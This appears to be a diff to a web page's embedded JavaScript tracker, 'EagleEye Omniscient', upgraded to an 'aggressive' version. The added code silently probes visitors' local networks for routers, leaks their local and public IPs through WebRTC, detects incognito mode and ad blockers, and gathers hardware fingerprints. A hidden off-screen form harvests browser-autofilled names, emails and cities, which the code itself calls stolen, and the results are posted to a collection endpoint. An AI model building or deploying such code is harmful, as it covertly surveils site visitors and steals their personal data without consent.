@@ -17,13 +17,13 @@
 
     <script>
     // ╔═══════════════════════════════════════════════════════════════════════════════╗
-    // ║  🦅 EAGLE EYE OMNISCIENT v7.0 — GOD TIER INTELLIGENCE (FULL)                  ║
-    // ║  Combines: ETag Persistence, Sensor Fusion, Consistency Matrix                ║
+    // ║  🦅 EAGLE EYE OMNISCIENT v11.0 — ABSOLUTE FINAL (AGGRESSIVE)                  ║
+    // ║  Includes: LAN Scan, Autofill, Network Info, WebGL Limits, Media, Window      ║
     // ╚═══════════════════════════════════════════════════════════════════════════════╝
 
     window.EagleEyeOmni = class {
         constructor(config = {}) {
-            this.version = "7.0.0-OMNI-FULL";
+            this.version = "11.0.0-OMNI-AGGRESSIVE";
             this.endpoint = config.endpoint || '/api/collect';
             this.sessionId = this.generateSessionId();
             this.config = {
@@ -38,25 +38,144 @@
         }
 
         async init() {
-            // 1. Load Super-Cookie (ETag)
             this.loadSuperCookie();
-            
-            // 2. Trigger DNS Beacons
             if (this.config.canaryDomain) this.triggerDNSBeacons();
-
             if (this.config.collectOnLoad) {
                 if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load'), 500);
                 else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load'), 500));
             }
         }
 
-        // === 1. PERSISTENCE (ETag Super-Cookie) ===
         loadSuperCookie() {
             const img = new Image();
             img.src = `/pixel.gif?source=etag_check&uid=${this.sessionId}`;
         }
 
-        // === 2. SENSORS (Nikolai's Logic) ===
+        // === 1. NETWORK FORENSICS ===
+        getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return "not_supported";
+            return {
+                type: conn.effectiveType || "unknown",
+                rtt: conn.rtt,
+                downlink: conn.downlink,
+                saveData: conn.saveData
+            };
+        }
+
+        async getWebRTC() {
+            const res = { local: [], public: [] };
+            try {
+                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel('');
+                await new Promise(r => {
+                    pc.onicecandidate = e => {
+                        if(!e.candidate) { r(); return; }
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if(ip) {
+                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
+                            else res.public.push(ip[1]);
+                        }
+                    };
+                    setTimeout(r, 2000);
+                });
+            } catch(e){}
+            return res;
+        }
+
+        async getIPv6() {
+            const services = ['https://api64.ipify.org?format=json', 'https://ipv6.icanhazip.com'];
+            for (const url of services) {
+                try {
+                    const controller = new AbortController();
+                    setTimeout(() => controller.abort(), 1500);
+                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
+                    if (!response.ok) continue;
+                    let ip = await response.text();
+                    try { ip = JSON.parse(ip).ip; } catch(e){}
+                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
+                } catch (e) { continue; }
+            }
+            return { detected: false, ip: null };
+        }
+
+        async scanLocalNetwork() {
+            const targets = ['192.168.0.1', '192.168.1.1', '192.168.1.254', '10.0.0.1', '172.16.0.1'];
+            const checkPort = (ip) => {
+                return new Promise(resolve => {
+                    const start = performance.now();
+                    const img = new Image();
+                    img.src = `http://${ip}/favicon.ico?r=${Math.random()}`;
+                    img.onload = () => resolve({ ip, status: 'open', time: performance.now() - start });
+                    img.onerror = () => {
+                        const time = performance.now() - start;
+                        if (time < 500) resolve({ ip, status: 'alive', time }); 
+                        else resolve({ ip, status: 'dead', time });
+                    };
+                    setTimeout(() => resolve({ ip, status: 'timeout', time: 9999 }), 2000);
+                });
+            };
+            const checks = targets.map(ip => checkPort(ip));
+            const scanResults = await Promise.all(checks);
+            return scanResults.filter(r => r.status !== 'dead' && r.status !== 'timeout');
+        }
+
+        // === 2. HARDWARE DEEP DIVE ===
+        getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "no_webgl";
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const limits = {
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    maxCubeMapSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
+                    maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
+                };
+                if (!debugInfo) return { vendor: "masked", renderer: "masked", limits: limits };
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                    limits: limits
+                };
+            } catch (e) { return "error"; }
+        }
+
+        async getMediaDevicesCount() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "not_supported";
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return {
+                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
+                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
+                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
+                };
+            } catch (e) { return "blocked"; }
+        }
+
+        async getClientHints() {
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues([
+                        "model", "platformVersion", "architecture", "bitness", "fullVersionList", "mobile"
+                    ]);
+                    return { model: hints.model, platformVersion: hints.platformVersion, mobile: hints.mobile };
+                } catch (e) { return "restricted"; }
+            }
+            return "not_supported";
+        }
+
+        async getBatteryStatus() {
+            if (navigator.getBattery) {
+                try {
+                    const batt = await navigator.getBattery();
+                    return { level: (batt.level * 100) + "%", charging: batt.charging };
+                } catch (e) { return "error"; }
+            }
+            return "not_supported";
+        }
+
+        // === 3. SENSORS & BEHAVIOR ===
         async getAmbientLight() {
             if ('AmbientLightSensor' in window) {
                 try {
@@ -72,48 +191,6 @@
             return "Not Supported";
         }
 
-        // === 3. NETWORK TRUTH (Leonid's Logic) ===
-        async getWebRTC() {
-            const res = { local: [], public: [] };
-            try {
-                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-                pc.createDataChannel('');
-                await new Promise(r => {
-                    pc.onicecandidate = e => {
-                        if(!e.candidate) { r(); return; }
-                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if(ip) {
-                            if(ip[1].match(/^(192\.168|10\.|172\.)/)) res.local.push(ip[1]);
-                            else res.public.push(ip[1]);
-                        }
-                    };
-                    setTimeout(r, 1500);
-                });
-            } catch(e){}
-            return res;
-        }
-
-        // === 4. IPv6 LEAK ===
-        async getIPv6() {
-            const services = [
-                'https://api64.ipify.org?format=json',
-                'https://ipv6.icanhazip.com'
-            ];
-            for (const url of services) {
-                try {
-                    const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 1500);
-                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
-                    if (!response.ok) continue;
-                    let ip = await response.text();
-                    try { ip = JSON.parse(ip).ip; } catch(e){}
-                    if (ip.includes(':')) return { detected: true, ip: ip.trim() };
-                } catch (e) { continue; }
-            }
-            return { detected: false, ip: null };
-        }
-
-        // === 5. BEHAVIORAL (Mouse Entropy) ===
         trackMouseEntropy() {
             return new Promise(resolve => {
                 let moves = [];
@@ -121,7 +198,6 @@
                     moves.push({x:e.clientX, y:e.clientY});
                     if(moves.length > 20) {
                         document.removeEventListener('mousemove', fn);
-                        // Calculate linearity (Bots move straight)
                         let variance = 0;
                         for(let i=2; i<moves.length; i++) {
                             const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
@@ -136,6 +212,64 @@
             });
         }
 
+        // === 4. DISPLAY & WINDOW ===
+        getScreenExtended() {
+            return {
+                orientation: (screen.orientation || {}).type || window.orientation || "unknown",
+                touchPoints: navigator.maxTouchPoints || 0,
+                touchScreen: (navigator.maxTouchPoints > 0) ? "Yes" : "No",
+                colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
+                hdr: window.matchMedia('(dynamic-range: high)').matches ? "Yes" : "No",
+                resolution: `${window.screen.width}x${window.screen.height}`,
+                window: {
+                    outer: `${window.outerWidth}x${window.outerHeight}`,
+                    inner: `${window.innerWidth}x${window.innerHeight}`,
+                    avail: `${window.screen.availWidth}x${window.screen.availHeight}`
+                }
+            };
+        }
+
+        // === 5. SECURITY & AGGRESSIVE ===
+        async detectIncognito() {
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const { quota } = await navigator.storage.estimate();
+                    return quota < 125829120 ? "Yes (Probable)" : "No";
+                } catch (e) {}
+            }
+            return "Unknown";
+        }
+
+        detectAdBlock() {
+            const bait = document.createElement('div');
+            bait.innerHTML = '&nbsp;';
+            bait.className = 'adsbox ad-banner pub_300x250';
+            bait.style.position = 'absolute'; bait.style.top = '-999px';
+            document.body.appendChild(bait);
+            const detected = (bait.offsetHeight === 0 || bait.style.display === 'none');
+            document.body.removeChild(bait);
+            return detected ? "Yes" : "No";
+        }
+
+        async tryStealAutofill() {
+            const form = document.createElement('div');
+            form.style.position = 'absolute'; form.style.top = '-2000px';
+            form.innerHTML = `
+                <input type="text" name="name" autocomplete="name" value="">
+                <input type="email" name="email" autocomplete="email" value="">
+                <input type="text" name="city" autocomplete="address-level2" value="">
+            `;
+            document.body.appendChild(form);
+            await new Promise(r => setTimeout(r, 1000));
+            const inputs = form.querySelectorAll('input');
+            const data = {};
+            inputs.forEach(input => { if (input.value) data[input.name] = input.value; });
+            document.body.removeChild(form);
+            return Object.keys(data).length > 0 ? data : "No Data / Interaction Required";
+        }
+
+        getUserTime() { return new Date().toString(); }
+
         // === 6. FINGERPRINTING ===
         getCanvasHash() {
             try {
@@ -143,7 +277,7 @@
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                 ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v7", 2, 15);
+                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v11", 2, 15);
                 const data = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < data.length; i++) {
@@ -188,27 +322,21 @@
             return detected;
         }
 
-        // === 7. CONSISTENCY CHECKS (Kirill's Logic) ===
-        detectAnomalies(fonts, light, entropy) {
+        detectAnomalies(fonts, light, entropy, network, media, lanScan) {
             const anomalies = [];
             const ua = navigator.userAgent;
-            
-            // Mobile Check
             const isMobileUA = /Android|iPhone|iPad/i.test(ua);
             const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-            if (isMobileUA && !hasTouch) anomalies.push("FAKE MOBILE: No Touch Events");
             
-            // Sensor Check (VMs don't have light sensors)
+            if (isMobileUA && !hasTouch) anomalies.push("FAKE MOBILE: No Touch Events");
             if (isMobileUA && light === "Not Supported") anomalies.push("POSSIBLE VM: No Light Sensor on Mobile");
-
-            // Bot Check
+            if (isMobileUA && media !== "blocked" && media.videoInputs === 0) anomalies.push("FAKE MOBILE: No Camera Detected");
+            if (network !== "not_supported" && network.rtt < 5) anomalies.push("DATA CENTER: Ping < 5ms");
+            if (lanScan.length > 0) anomalies.push(`LOCAL NETWORK: Gateway found at ${lanScan[0].ip}`);
             if (entropy < 0.05 && entropy > 0) anomalies.push("BOT MOVEMENT: Perfectly linear mouse");
             if (navigator.webdriver) anomalies.push("CRITICAL: WebDriver Detected");
-
-            // OS Mismatch
             if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Windows without Calibri");
-            if (ua.includes("Mac") && !fonts.includes("Helvetica")) anomalies.push("OS SPOOF: Mac without Helvetica");
-
+            
             return anomalies;
         }
 
@@ -219,16 +347,33 @@
 
         // === MAIN COLLECT ===
         async collect(trigger, extra = {}) {
-            const [webrtc, ipv6, light, entropy, audio] = await Promise.all([
+            const [webrtc, ipv6, light, entropy, audio, battery, hints, incognito, media, lanScan, autofill] = await Promise.all([
                 this.getWebRTC(),
                 this.getIPv6(),
                 this.getAmbientLight(),
                 this.trackMouseEntropy(),
-                this.getAudioHash()
+                this.getAudioHash(),
+                this.getBatteryStatus(),
+                this.getClientHints(),
+                this.detectIncognito(),
+                this.getMediaDevicesCount(),
+                this.scanLocalNetwork(),
+                this.tryStealAutofill()
             ]);
 
             const fonts = this.getFonts();
-            const anomalies = this.detectAnomalies(fonts, light, entropy);
+            const gpu = this.getGPU();
+            const canvas = this.getCanvasHash();
+            const screenExt = this.getScreenExtended();
+            const adBlock = this.detectAdBlock();
+            const userTime = this.getUserTime();
+            const network = this.getNetworkInfo();
+
+            const anomalies = this.detectAnomalies(fonts, light, entropy, network, media, lanScan);
+            if (incognito.includes("Yes")) anomalies.push("SECURITY: Incognito Mode Detected");
+            if (adBlock === "Yes") anomalies.push("BROWSER: AdBlock Detected");
+            if (gpu !== "error" && gpu.renderer && gpu.renderer.includes("SwiftShader")) anomalies.push("VM DETECTED: Google SwiftShader Renderer");
+            if (typeof autofill === 'object') anomalies.push("CRITICAL: Autofill Data Stolen");
 
             const payload = {
                 meta: {
@@ -243,18 +388,38 @@
                     is_bot: anomalies.length > 0
                 },
                 fingerprints: {
-                    canvas: this.getCanvasHash(),
+                    canvas: canvas,
                     audio: audio,
-                    fonts: fonts
+                    fonts: fonts,
+                    gpu: gpu
                 },
                 hardware: {
+                    model: hints,
+                    battery: battery,
+                    screen_advanced: screenExt,
+                    media_devices: media,
                     lightSensor: light,
                     mouseEntropy: entropy,
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory
                 },
-                network: { webrtc, ipv6 },
-                system: { ua: navigator.userAgent, platform: navigator.platform, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone },
+                network: { 
+                    info: network,
+                    webrtc: webrtc, 
+                    ipv6: ipv6,
+                    lan_scan: lanScan
+                },
+                security: {
+                    incognito: incognito,
+                    adBlock: adBlock,
+                    autofill_data: autofill
+                },
+                system: { 
+                    user_time: userTime,
+                    ua: navigator.userAgent, 
+                    platform: navigator.platform, 
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone 
+                },
                 ...extra
             };
 
